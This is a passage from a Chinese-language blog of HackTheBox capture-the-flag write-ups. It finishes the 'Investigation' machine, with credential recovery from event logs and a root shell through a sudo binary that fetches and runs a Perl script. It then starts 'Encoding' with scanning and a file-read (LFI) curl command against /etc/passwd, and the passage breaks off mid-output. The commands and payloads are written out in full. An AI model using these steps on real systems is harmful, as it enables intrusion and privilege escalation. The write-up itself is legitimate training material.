class="line">_laurel:x:997:997::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure>
<p>查找与用户<code>smorton</code>相关的文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user smorton -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;home&#x2F;smorton</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;investigation&#x2F;Windows Event Logs for Analysis.msg</span><br></pre></td></tr></table></figure>
<p>查看文件权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la /usr/<span class="built_in">local</span>/investigation/Windows\ Event\ Logs\ <span class="keyword">for</span>\ Analysis.msg</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rw-rw-r-- 1 smorton smorton 1308160 Oct  1 00:35 &#x2F;usr&#x2F;local&#x2F;investigation&#x2F;Windows Event Logs for Analysis.msg</span><br></pre></td></tr></table></figure>
<p>查看Web路径权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la /var/www/html/</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">total 44</span><br><span class="line">dr-xr-x--- 4 www-data www-data  4096 Jan  9 10:50 .</span><br><span class="line">dr-xr-x--- 4 www-data www-data  4096 Sep 30 22:26 ..</span><br><span class="line">drwxrwx--- 2 www-data www-data  4096 Mar 21 13:02 analysed_images</span><br><span class="line">dr-xr-x--- 7 www-data www-data  4096 Oct  1 00:31 assets</span><br><span class="line">-r-xr-x--- 1 www-data www-data 10957 Oct  1 00:31 index.html</span><br><span class="line">-r-xr-x--- 1 www-data www-data  4335 Oct  1 00:31 service.html</span><br><span class="line">-r-xr-x--- 1 www-data www-data  5193 Oct  1 00:31 upload.php</span><br></pre></td></tr></table></figure>
<p>更改Web路径权限并将文件移动至Web路径</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /var/www/html/</span><br><span class="line">cp /usr/<span class="built_in">local</span>/investigation/Windows\ Event\ Logs\ <span class="keyword">for</span>\ Analysis.msg /var/www/html/BFL.msg</span><br></pre></td></tr></table></figure>
<p>下载文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://eforenzics.htb/BFL.msg</span><br><span class="line">file BFL.msg</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BFL.msg: CDFV2 Microsoft Outlook Message</span><br></pre></td></tr></table></figure>
<blockquote>
<p>apt-get install evolution<br />
<a target="_blank" rel="noopener" href="https://www.zamzar.com/converters/document/msg/">https://www.zamzar.com/converters/document/msg/</a></p>
</blockquote>
<p>转换为pst格式文件并在evolution中打开</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Hi Steve,</span><br><span class="line"></span><br><span class="line">Can you look through these logs to see if our analysts have been logging on to the inspection terminal. I&#39;m concerned that they are moving data on to production without following our data transfer procedures. </span><br><span class="line"></span><br><span class="line">Regards.</span><br><span class="line">Tom</span><br></pre></td></tr></table></figure>
<p>导出zip并解压后得到<code>security.evtx</code></p>
<blockquote>
<p>pip install python-evtx</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evtx_dump.py security.evtx &gt; sec.xml</span><br></pre></td></tr></table></figure>
<p>查找以下内容</p>
<p><code>&lt;EventID Qualifiers=&quot;&quot;&gt;4625&lt;/EventID&gt;</code></p>
<p>某个匹配结果附近找到字符串<code>Def@ultf0r3nz!csPa$$</code></p>
<p>尝试登入SSH</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh smorton@10.10.11.197</span><br><span class="line">Def@ultf0r3nz!csPa$$</span><br></pre></td></tr></table></figure>
<p>登入成功，查看user.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/smorton/user.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e98d3d1effe4d3e1d9e1dcb2574d7ac</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-25"><a class="markdownIt-Anchor" href="#权限提升-25"></a> 权限提升</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for smorton on investigation:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User smorton may run the following commands on investigation:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;binary</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la /usr/bin/binary</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r-xr-xr-- 1 root root 19024 Jan  5 16:02 &#x2F;usr&#x2F;bin&#x2F;binary</span><br></pre></td></tr></table></figure>
<p>在Web用户的Shell中更改Web路径权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 /var/www</span><br><span class="line">chmod 777 /var/www/html</span><br></pre></td></tr></table></figure>
<p>移动文件至Web路径</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/bin/binary /var/www/html/</span><br></pre></td></tr></table></figure>
<p>获取文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://eforenzics.htb/binary</span><br></pre></td></tr></table></figure>
<p>IDA中反编译的主函数如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> *s; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> *command; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( argc != <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Exiting... &quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( getuid() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Exiting... &quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(argv[<span class="number">2</span>], <span class="string">&quot;lDnxUysaQn&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Exiting... &quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Running... &quot;</span>);</span><br><span class="line">  stream = fopen(argv[<span class="number">2</span>], <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">  v5 = curl_easy_init();</span><br><span class="line">  curl_easy_setopt(v5, <span class="number">10002LL</span>, argv[<span class="number">1</span>]);</span><br><span class="line">  curl_easy_setopt(v5, <span class="number">10001LL</span>, stream);</span><br><span class="line">  curl_easy_setopt(v5, <span class="number">45LL</span>, <span class="number">1LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)curl_easy_perform(v5) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Exiting... &quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = <span class="built_in">snprintf</span>(<span class="number">0LL</span>, <span class="number">0LL</span>, <span class="string">&quot;%s&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">  s = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v6 + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(s, v6 + <span class="number">1</span>, <span class="string">&quot;%s&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">  v7 = <span class="built_in">snprintf</span>(<span class="number">0LL</span>, <span class="number">0LL</span>, <span class="string">&quot;perl ./%s&quot;</span>, s);</span><br><span class="line">  command = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v7 + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(command, v7 + <span class="number">1</span>, <span class="string">&quot;perl ./%s&quot;</span>, s);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  curl_easy_cleanup(v5);</span><br><span class="line">  setuid(<span class="number">0</span>);</span><br><span class="line">  system(command);</span><br><span class="line">  system(<span class="string">&quot;rm -f ./lDnxUysaQn&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>10002LL: This sets the URL to use for the request, and the value is passed in as the argv[1] parameter.</li>
<li>10001LL: This sets the output stream to use for the response, and the value is passed in as the stream parameter.</li>
<li>45LL: This sets the CURLOPT_VERBOSE option to 1, which causes libcurl to output verbose information about the request and response to the console.</li>
</ul>
<blockquote>
<p>Generated by ChatGPT</p>
</blockquote>
<p>大概意思是<code>curl argv[1] -o argv[2] -v</code></p>
<p>构造perl提权脚本并触发</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exec &quot;/bin/bash&quot;;&#x27;</span> &gt; /tmp/bfl</span><br><span class="line">sudo -u root /usr/bin/binary file:///tmp/bfl lDnxUysaQn</span><br></pre></td></tr></table></figure>
<p>get root, 查看root.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4a5dc64d395878aa52ec1bc85c579d67</span><br></pre></td></tr></table></figure>
<hr />
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;upload&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]==<span class="number">0</span>) &#123;</span><br><span class="line">		<span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>);</span><br><span class="line">		<span class="variable">$image_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">		<span class="variable">$original_name</span> = <span class="variable">$image_name</span>;</span><br><span class="line">		<span class="variable">$sanitised</span> = preg_replace(<span class="string">&#x27;/[^a-zA-Z0-9]+/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$original_name</span>);</span><br><span class="line">		<span class="variable">$image_type</span> = getimagesize(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">		<span class="variable">$image_name</span> = explode(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$image_name</span>);</span><br><span class="line">		<span class="variable">$folder</span>=time();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(in_array(<span class="variable">$image_type</span>[<span class="string">&#x27;mime&#x27;</span>], <span class="variable">$allow_type</span>))&#123;</span><br><span class="line">			<span class="keyword">list</span>(<span class="variable">$width</span>, <span class="variable">$height</span>, <span class="variable">$mime</span>) = getimagesize(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$width</span>&gt;<span class="number">0</span> &amp;&amp; <span class="variable">$height</span>&gt;<span class="number">0</span>) &#123;</span><br><span class="line">				mkdir(<span class="string">&quot;/var/www/uploads/<span class="subst">$folder</span>&quot;</span>);</span><br><span class="line">				<span class="variable">$upload</span> = move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;/var/www/uploads/&#x27;</span>.<span class="variable">$folder</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (<span class="variable">$upload</span>) &#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;&#x27;</span>.<span class="variable">$sanitised</span>.<span class="string">&#x27; has been uploaded. The analysis report can be viewed &lt;a href=analysed_images/&#x27;</span>.<span class="variable">$sanitised</span>.<span class="string">&#x27;.txt&gt;here&lt;/a&gt; &lt;/p&gt;&#x27;</span>;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Please save this report as it will only be available for the next five minutes&lt;/p&gt;&#x27;</span>;</span><br><span class="line">					<span class="variable">$folder</span> = <span class="string">&quot;/var/www/uploads/<span class="subst">$folder</span>&quot;</span>;</span><br><span class="line">					<span class="variable">$cmd</span> = <span class="string">&quot;cd <span class="subst">$folder</span> &amp;&amp; /opt/exiftool/exiftool * &gt; /var/www/html/analysed_images/<span class="subst">$sanitised</span>.txt&quot;</span>;</span><br><span class="line">					shell_exec(<span class="variable">$cmd</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&#x27;Error: Only JPEG and PNG are allowed&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;Error: Only JPEG and PNG are allow&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">	&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Error: Invalid File Type!&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>意思是没必要用<code>`</code></p>
<hr />
<h1 id="hackthebox_encoding"><a class="markdownIt-Anchor" href="#hackthebox_encoding"></a> HackTheBox_Encoding</h1>
<h2 id="信息收集-10"><a class="markdownIt-Anchor" href="#信息收集-10"></a> 信息收集</h2>
<h3 id="端口扫描-27"><a class="markdownIt-Anchor" href="#端口扫描-27"></a> 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.198</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.198</span><br><span class="line">Host is up (0.42s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.52 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<h3 id="路径枚举-7"><a class="markdownIt-Anchor" href="#路径枚举-7"></a> 路径枚举</h3>
<p>在站点中获得域名信息<code>haxtables.htb</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.198\thaxtables.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
<h3 id="vhost-3"><a class="markdownIt-Anchor" href="#vhost-3"></a> VHOST</h3>
<p>枚举VHOST</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u <span class="string">&quot;http://haxtables.htb&quot;</span> -H <span class="string">&quot;Host: FUZZ.haxtables.htb&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload                                             </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">000000051:   200        0 L      0 W        0 Ch        &quot;api&quot;                                               </span><br><span class="line">000000177:   403        9 L      28 W       284 Ch      &quot;image&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.198\tapi.haxtables.htb&quot;</span> &gt;&gt; /etc/hosts</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.198\timage.haxtables.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-25"><a class="markdownIt-Anchor" href="#漏洞利用-25"></a> 漏洞利用</h2>
<p>页面给出的API调用方法如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">json_data = &#123;</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;str2hex&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;file_url&#x27;</span> : <span class="string">&#x27;http://example.com/data.txt&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(<span class="string">&#x27;http://api.haxtables.htb/v3/tools/string/index.php&#x27;</span>, json=json_data)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
<p>参数<code>file_url</code>可能存在LFI漏洞</p>
<p>利用API进行LFI</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://api.haxtables.htb/v3/tools/string/index.php --json <span class="string">&#x27;&#123;&quot;action&quot;:&quot;b64encode&quot;,&quot;file_url&quot;:&quot;file:///etc/passwd&quot;&#125;&#x27;</span> | jq -r .data | base64 -d</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:104::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:104:105:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:105:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:106:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:107:113::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span 